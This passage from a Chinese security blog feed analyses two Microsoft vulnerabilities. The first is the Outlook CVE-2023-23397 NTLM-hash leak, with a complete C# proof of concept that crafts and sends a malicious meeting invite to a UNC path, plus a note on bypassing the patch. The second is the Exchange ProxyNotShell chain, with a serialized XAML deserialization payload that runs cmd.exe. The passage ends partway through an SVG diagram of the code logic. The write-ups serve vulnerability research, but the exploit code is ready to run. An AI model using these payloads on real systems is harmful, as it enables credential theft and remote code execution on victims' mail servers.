&lt;p>即PidLidReminderFileParameter可以指向网络共享文件。攻击者将恶意会议邀请的PidLidReminderFileParameter属性设为攻击者控制的系统对应的UNC路径，并将PidLidReminderOverride属性设为true，将邀请发给受害者邮箱，当受害者在outlook上登录了邮箱时，outlook会自动获取该文件，当该路径参数为UNC路径时，outlook会以该用户身份向这个UNC路径对应的系统发起NTLM认证，尝试获取UNC路径指向的文件，此时攻击者可以获取到该认证hash，并将该hash中继到其他服务上，即可获取到受害者的权限。&lt;/p>
&lt;p>该漏洞PoC先使用MsgKit库生成msg文件（outlook邮件格式），而后利用Aspose库读取msg文件并将其反序列化为MapiMessage对象，在其上添加ReminderSet并置为true，而后转换为MailMessage对象，通过smtpClient.Send发给受害者。从而触发漏洞，获取到受害者NTLM hash。 在微软2023年3月补丁日中对此漏洞进行了修复，但此漏洞修复不完全，只是限制了PidLidReminderFileParameter属性内不能含有”.”，导致攻击者可以使用\aaa\形式绕过此补丁。&lt;/p>
&lt;p>PoC&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-csharp" data-lang="csharp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">using&lt;/span> System;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">using&lt;/span> Aspose.Email.Mapi;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">using&lt;/span> Aspose.Email;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">using&lt;/span> Aspose.Email.Clients.Smtp;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">namespace&lt;/span> MsgKit
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Program&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> Main(&lt;span style="color:#66d9ef">string&lt;/span>[] args)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">string&lt;/span> lanPath = &lt;span style="color:#e6db74">@&amp;#34;\\server\test\&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">string&lt;/span> saveFilePath = &lt;span style="color:#e6db74">@&amp;#34;saveFilePath&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">using&lt;/span> (&lt;span style="color:#66d9ef">var&lt;/span> appoionment = &lt;span style="color:#66d9ef">new&lt;/span> Appointment(
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">new&lt;/span> Sender(&lt;span style="color:#e6db74">&amp;#34;winserver@domain.com&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;Sender&amp;#34;&lt;/span>),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">new&lt;/span> Representing(&lt;span style="color:#e6db74">&amp;#34;winserver@domain.com&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;Sender&amp;#34;&lt;/span>),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;pish&amp;#34;&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> appoionment.Recipients.AddTo(&lt;span style="color:#e6db74">&amp;#34;administrator@domain.com&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;administrator&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> appoionment.Subject = &lt;span style="color:#e6db74">&amp;#34;pish&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> appoionment.Location = &lt;span style="color:#e6db74">&amp;#34;Virtual&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> appoionment.MeetingStart = DateTime.Now.Date;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> appoionment.MeetingEnd = DateTime.Now.Date.AddHours(&lt;span style="color:#ae81ff">2&lt;/span>).Date;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> appoionment.AllDay = &lt;span style="color:#66d9ef">true&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> appoionment.BodyText = &lt;span style="color:#e6db74">&amp;#34;hello, world&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> appoionment.BodyHtml = &lt;span style="color:#e6db74">&amp;#34;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;b&amp;gt;hello, pls read it.&amp;lt;/b&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> appoionment.SentOn = DateTime.UtcNow;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> appoionment.Importance = MsgKit.Enums.MessageImportance.IMPORTANCE_NORMAL;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> appoionment.IconIndex = MsgKit.Enums.MessageIconIndex.UnsentMail;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> appoionment.PidLidReminderFileParameter = lanPath;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> appoionment.PidLidReminderOverride = &lt;span style="color:#66d9ef">false&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> appoionment.Save(saveFilePath);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">var&lt;/span> msg = MapiMessage.Load(saveFilePath);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> msg.SetProperty(KnownPropertyList.ReminderSet, &lt;span style="color:#66d9ef">true&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> msg.SetProperty(KnownPropertyList.ReminderFileParameter, lanPath + &lt;span style="color:#e6db74">&amp;#34;\a&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> msg.SetProperty(KnownPropertyList.ReminderOverride, &lt;span style="color:#66d9ef">true&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> SmtpClient smtpClient = &lt;span style="color:#66d9ef">new&lt;/span> SmtpClient();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> smtpClient.Host = &lt;span style="color:#e6db74">&amp;#34;Host&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> smtpClient.Username = &lt;span style="color:#e6db74">&amp;#34;username&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> smtpClient.Password = &lt;span style="color:#e6db74">&amp;#34;Password&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> smtpClient.Port = &lt;span style="color:#ae81ff">587&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> smtpClient.SecurityOptions = Aspose.Email.Clients.SecurityOptions.SSLExplicit;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">var&lt;/span> options = &lt;span style="color:#66d9ef">new&lt;/span> MailConversionOptions();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> options.KeepOriginalEmailAddresses = &lt;span style="color:#66d9ef">true&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> options.ConvertAsTnef = &lt;span style="color:#66d9ef">true&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> options.PreserveEmbeddedMessageFormat = &lt;span style="color:#66d9ef">true&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> options.PreserveRtfContent = &lt;span style="color:#66d9ef">true&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> smtpClient.Send(msg.ToMailMessage(options));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Console.WriteLine(&lt;span style="color:#e6db74">&amp;#34;success send&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">catch&lt;/span> (Exception ex)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Console.WriteLine(&lt;span style="color:#e6db74">&amp;#34;error:&amp;#34;&lt;/span> + ex.ToString());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="小结">小结&lt;/h3>
&lt;p>该漏洞是典型的逻辑漏洞，由于微软没有限制邮件的过期声音文件路径属性，导致可以设置这个属性为UNC路径来让outlook发起NTLM请求，尝试从网络加载文件，从而偷取NTLM hash。&lt;/p>
&lt;p>第一次尝试使用outlook构造PoC时失败了，最后找到了C#的邮件库Aspose，通过修改Aspose库并利用该库就可以设置PidLidReminderFileParameter属性了。&lt;/p>
&lt;p>&lt;strong>参考链接&lt;/strong>&lt;/p>
&lt;blockquote>
&lt;p>
&lt;a href="https://www.mdsec.co.uk/2023/03/exploiting-cve-2023-23397-microsoft-outlook-elevation-of-privilege-vulnerability/" target="_blank">https://www.mdsec.co.uk/2023/03/exploiting-cve-2023-23397-microsoft-outlook-elevation-of-privilege-vulnerability/&lt;/a>&lt;/p>
&lt;p>
&lt;a href="https://github.com/Sicos1977/MsgKit" target="_blank">https://github.com/Sicos1977/MsgKit&lt;/a>&lt;/p>
&lt;p>
&lt;a href="https://research.checkpoint.com/2023/the-obvious-the-normal-and-the-advanced-a-comprehensive-analysis-of-outlook-attack-vectors/" target="_blank">https://research.checkpoint.com/2023/the-obvious-the-normal-and-the-advanced-a-comprehensive-analysis-of-outlook-attack-vectors/&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;strong>Created at 2023-05-05T20:50:19+08:00&lt;/strong>&lt;/p></description></item><item><title>Proxy Not Shell 利用链分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/proxy-not-shell/</link><pubDate>Fri, 05 May 2023 20:35:49 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/proxy-not-shell/</guid><description>&lt;h3 id="漏洞环境">漏洞环境&lt;/h3>
&lt;ul>
&lt;li>Windows Server 2019&lt;/li>
&lt;li>Windows Exchange 2019 CU9&lt;/li>
&lt;/ul>
&lt;h3 id="漏洞分析">漏洞分析&lt;/h3>
&lt;p>漏洞链包含了两个漏洞：&lt;/p>
&lt;ul>
&lt;li>CVE-2022-41040 Exchange 权限提升漏洞&lt;/li>
&lt;li>CVE-2022-41082 Exchange 远程代码执行漏洞&lt;/li>
&lt;/ul>
&lt;p>CVE-2022-41040 是ProxyShell修复不完全的产物，在ProxyShell利用链中无需身份验证就可以通过autodiscover.json请求到/PowerShell接口，在CVE-2022-41040 中，仅需要低权限身份验证就可以请求到该接口，通过SSRF将低权限转换为高权限。&lt;/p>
&lt;p>CVE-2022-41082是Exchange的反序列化漏洞，通过传入恶意序列化数据，使得Exchange触发能够造成代码执行的反序列化过程，将指定数据反序列化到恶意类，从而在Exchange服务器上执行任意代码。&lt;/p>
&lt;p>在PoC中发送了以下三种类型的PSRP消息&lt;/p>
&lt;ul>
&lt;li>
&lt;p>0x00010002 SESSION_CAPABILITY&lt;/p>
&lt;p>SESSION_CAPABILITY 应该是创建RunspacePool&lt;/p>
&lt;/li>
&lt;li>
&lt;p>0x00010004 INIT_RUNSPACEPOOL&lt;/p>
&lt;p>INIT_RUNSPACEPOOL 应该是初始化RunspacePool&lt;/p>
&lt;/li>
&lt;li>
&lt;p>0x00021006 CREATE_PIPELINE&lt;/p>
&lt;p>创建命令管道并在指定的 RunspacePool 中调用它&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>PoC通过PSRP协议创建了远程PowerShell管道，并试图在这个管道内执行New-OfflineAddressBook这个cmdlet，并将对应的序列化数据传给了Exchange。&lt;/p>
&lt;p>PoC主要组成部分如下所示，BA标签内是base64编码的序列化&lt;em>System.UnitySerializationHolder&lt;/em>对象&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-xml" data-lang="xml">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;Obj&lt;/span> &lt;span style="color:#a6e22e">N=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;V&amp;#34;&lt;/span> &lt;span style="color:#a6e22e">RefId=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;14&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;TN&lt;/span> &lt;span style="color:#a6e22e">RefId=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;2&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;T&amp;gt;&lt;/span>System.ServiceProcess.ServiceController&lt;span style="color:#f92672">&amp;lt;/T&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;T&amp;gt;&lt;/span>System.Object&lt;span style="color:#f92672">&amp;lt;/T&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/TN&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;ToString&amp;gt;&lt;/span>System.ServiceProcess.ServiceController&lt;span style="color:#f92672">&amp;lt;/ToString&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;Props&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;S&lt;/span> &lt;span style="color:#a6e22e">N=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Name&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>Type&lt;span style="color:#f92672">&amp;lt;/S&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;Obj&lt;/span> &lt;span style="color:#a6e22e">N=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;TargetTypeForDeserialization&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;TN&lt;/span> &lt;span style="color:#a6e22e">RefId=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;2&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;T&amp;gt;&lt;/span>System.Exception&lt;span style="color:#f92672">&amp;lt;/T&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;T&amp;gt;&lt;/span>System.Object&lt;span style="color:#f92672">&amp;lt;/T&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/TN&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;MS&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;BA&lt;/span> &lt;span style="color:#a6e22e">N=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;SerializationData&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>AAEAAAD/////AQAAAAAAAAAEAQAAAB9TeXN0ZW0uVW5pdHlTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAREYXRhCVVuaXR5VHlwZQxBc3NlbWJseU5hbWUBAAEIBgIAAAAgU3lzdGVtLldpbmRvd3MuTWFya3VwLlhhbWxSZWFkZXIEAAAABgMAAABYUHJlc2VudGF0aW9uRnJhbWV3b3JrLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49MzFiZjM4NTZhZDM2NGUzNQs=&lt;span style="color:#f92672">&amp;lt;/BA&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/MS&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/Obj&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/Props&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;S&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">&amp;lt;![CDATA[&amp;lt;ResourceDictionary xmlns=&amp;#34;http://schemas.microsoft.com/winfx/2006/xaml/presentation&amp;#34; xmlns:x=&amp;#34;http://schemas.microsoft.com/winfx/2006/xaml&amp;#34; xmlns:System=&amp;#34;clr-namespace:System;assembly=mscorlib&amp;#34; xmlns:Diag=&amp;#34;clr-namespace:System.Diagnostics;assembly=system&amp;#34;&amp;gt;&amp;lt;ObjectDataProvider x:Key=&amp;#34;LaunchCalch&amp;#34; ObjectType=&amp;#34;{x:Type Diag:Process}&amp;#34; MethodName=&amp;#34;Start&amp;#34;&amp;gt;&amp;lt;ObjectDataProvider.MethodParameters&amp;gt;&amp;lt;System:String&amp;gt;cmd.exe&amp;lt;/System:String&amp;gt;&amp;lt;System:String&amp;gt;/c whoami&amp;gt; c:\users\public\1.txt&amp;lt;/System:String&amp;gt; &amp;lt;/ObjectDataProvider.MethodParameters&amp;gt; &amp;lt;/ObjectDataProvider&amp;gt; &amp;lt;/ResourceDictionary&amp;gt;]]&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/S&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/Obj&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>XamlReader.Parse()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>BA标签数据
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>.....ÿÿÿÿ..............System.UnitySerializationHolder.....
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Data UnityType.AssemblyName......... System.Windows.Markup.XamlReader.........
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>XPresentationFramework, Version=4.0.0.0, Culture=neutral,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PublicKeyToken=31bf3856ad364e35.
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>PoC部分由两个对象嵌套而成，大致结构如下所示：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-xml" data-lang="xml">&lt;span style="display:flex;">&lt;span>Obj V(System.ServiceProcess.ServiceController):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String Name=&amp;#34;Type&amp;#34;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Obj TargetTypeForDeserialization(System.Exception):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ByteArray SerializationData
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String SerializationData
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>代码逻辑&lt;/strong>&lt;/p>
&lt;p>代码逻辑如下图&lt;/p>
&lt;?xml version="1.0" encoding="UTF-8" standalone="no"?>
&lt;!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
&lt;!-- 由 Microsoft Visio, SVG Export 生成 sadf.svg Page-1 -->
&lt;svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:ev="http://www.w3.org/2001/xml-events"
xmlns:v="http://schemas.microsoft.com/visio/2003/SVGExtensions/" width="10.4331in" height="18.8976in"
viewBox="0 0 751.181 1360.63" xml:space="preserve" color-interpolation-filters="sRGB" class="st12">
&lt;v:documentProperties v:langID="2052" v:metric="true" v:viewMarkup="false">
&lt;v:userDefs>
&lt;v:ud v:nameU="msvNoAutoConnect" v:val="VT0(0):26"/>
&lt;/v:userDefs>
&lt;/v:documentProperties>
&lt;style type="text/css">
&lt;![CDATA[
.st1 {fill:url(#grad3-4);stroke:none;stroke-linecap:round;stroke-linejoin:round;stroke-width:0.5}
.st2 {fill:#1ba1e2;stroke:#ffffff;stroke-linecap:round;stroke-linejoin:round;stroke-width:0.5}
.st3 {fill:#ffffff;font-family:Segoe UI;font-size:0.666664em}
.st4 {font-family:黑体;font-size:1em}
.st5 {font-size:1em}
.st6 {marker-end:url(#mrkr4-19);stroke:#1998d6;stroke-linecap:round;stroke-linejoin:round;stroke-width:0.5}
.st7 {fill:#1998d6;fill-opacity:1;stroke:#1998d6;stroke-opacity:1;stroke-width:0.16556291390728}
.st8 {fill:#ffffff;stroke:none;stroke-linecap:butt;stroke-width:7.2}
.st9 {fill:#1076a7;font-family:黑体;font-size:0.666664em}
.st10 {font-family:Segoe UI;font-size:1em}
.st11 {fill:#ffffff;font-family:黑体;font-size:0.666664em}
.st12 {fill:none;fill-rule:evenodd;font-size:12px;overflow:visible;stroke-linecap:square;stroke-miterlimit:3}
]]>
&lt;/style>
&lt;defs id="Patterns_And_Gradients">
&lt;radialGradient id="grad3-4" cx="0.5" cy="0.5" r="0.73">
&lt;stop offset="0" stop-color="#d2ecf9" stop-opacity="1"/>
&lt;stop offset="1" stop-color="#e7f5fc" stop-opacity="1"/>
&lt;/radialGradient>
&lt;/defs>
&lt;defs id="Markers">
&lt;g id="lend4">
&lt;path d="M 2 1 L 0 0 L 2 -1 L 2 1 " style="stroke:none"/>
&lt;/g>
&lt;marker id="mrkr4-19" class="st7" v:arrowType="4" v:arrowSize="2" v:setback="12.08" refX="-12.08" orient="auto"
markerUnits="strokeWidth" overflow="visible">
&lt;use xlink:href="#lend4" transform="scale(-6.04,-6.04) "/>
&lt;/marker>
&lt;/defs>
&lt;g v:mID="4" v:index="1" v:groupContext="backgroundPage">
&lt;v:userDefs>
&lt;v:ud v:nameU="msvVisioCreated" v:prompt="" v:val="VT0(0):26"/>
&lt;/v:userDefs>
&lt;title>背景 1&lt;/title>
&lt;v:pageProperties width="10.4331" height="18.8976" v:drawingScale="0.0393701" v:pageScale="0.0393701" v:drawingUnits="24"
v:shadowOffsetX="8.50394" v:shadowOffsetY="-8.50394"/>
&lt;g id="shape2-1" v:mID="2" v:groupContext="shape">
&lt;title>Center Gradient&lt;/title>
&lt;v:userDefs>
&lt;v:ud v:nameU="Background" v:val="VT0(0):26"/>
&lt;v:ud v:nameU="visVersion" v:val="VT0(15):26"/>
&lt;v:ud v:nameU="msvShapeCategories" v:prompt="" v:val="VT4(DoNotContain)"/>
&lt;v:ud v:nameU="msvVisioCreated" v:prompt="" v:val="VT0(0):26"/>
&lt;/v:userDefs>
&lt;rect x="0" y="0" width="751.181" height="1360.63" class="st1"/>
&lt;/g>
&lt;/g>
&lt;g v:mID="0" v:index="2" v:groupContext="foregroundPage">
&lt;v:userDefs>
&lt;v:ud v:nameU="msvThemeOrder" v:val="VT0(0):26"/>
&lt;/v:userDefs>
&lt;title>页-1&lt;/title>
&lt;v:pageProperties v:drawingScale="0.0393701" v:pageScale="0.0393701" v:drawingUnits="24" v:shadowOffsetX="8.50394"
v:shadowOffsetY="-8.50394"/>
&lt;v:layer v:name="流程图" v:index="0"/>
&lt;v:layer v:name="连接线" v:index="1"/>
&lt;g id="shape7-5" v:mID="7" v:groupContext="shape" v:layerMember="0" transform="translate(108.725,-1026.2)">
&lt;title>流程&lt;/title>
&lt;desc>ReadOneObject&lt;/desc>
&lt;v:custProps>
&lt;v:cp v:nameU="Cost" v:lbl="成本" v:prompt="" v:type="7" v:format="@" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="ProcessNumber" v:lbl="流程编号" v:prompt="" v:type="2" v:format="" v:sortKey="" v:invis="false"
v:ask="false" v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="Owner" v:lbl="所有者" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="Function" v:lbl="职能" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0" v:val="VT4()"/>
&lt;v:cp v:nameU="StartDate" v:lbl="开始日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false"
v:ask="false" v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="EndDate" v:lbl="结束日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="Status" v:lbl="状态" v:prompt="" v:type="4" v:format=";未开始;进行中;已完成;已推迟;正在等待输入" v:sortKey=""
v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/>
&lt;/v:custProps>
&lt;v:userDefs>
&lt;v:ud v:nameU="visVersion" v:prompt="" v:val="VT0(15):26"/>
&lt;v:ud v:nameU="DefaultWidth" v:prompt="" v:val="VT0(0.98425196850394):24"/>
&lt;v:ud v:nameU="DefaultHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/>
&lt;v:ud v:nameU="ResizeTxtHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/>
&lt;/v:userDefs>
&lt;v:textBlock v:margins="rect(2,2,2,2)" v:tabSpace="42.5197"/>
&lt;v:textRect cx="51.5696" cy="1335.88" width="103.14" height="49.5068"/>
&lt;rect x="0" y="1311.12" width="103.139" height="49.5068" class="st2"/>
&lt;text x="23.69" y="1338.28" class="st3" v:langID="1033">&lt;v:paragraph v:horizAlign="1"/>&lt;v:tabList/>ReadOneObject&lt;/text> &lt;/g>
&lt;g id="shape8-8" v:mID="8" v:groupContext="shape" v:layerMember="0" transform="translate(78.3257,-894.183)">
&lt;title>流程.8&lt;/title>
&lt;desc>ReadOneDeserializedObject 遍历XML树的标签&lt;/desc>
&lt;v:custProps>
&lt;v:cp v:nameU="Cost" v:lbl="成本" v:prompt="" v:type="7" v:format="@" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="ProcessNumber" v:lbl="流程编号" v:prompt="" v:type="2" v:format="" v:sortKey="" v:invis="false"
v:ask="false" v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="Owner" v:lbl="所有者" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0"/>
&lt;v:cp v:nameU="Function" v:lbl="职能" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false"
v:langID="2052" v:cal="0" v:val="VT4()"/>
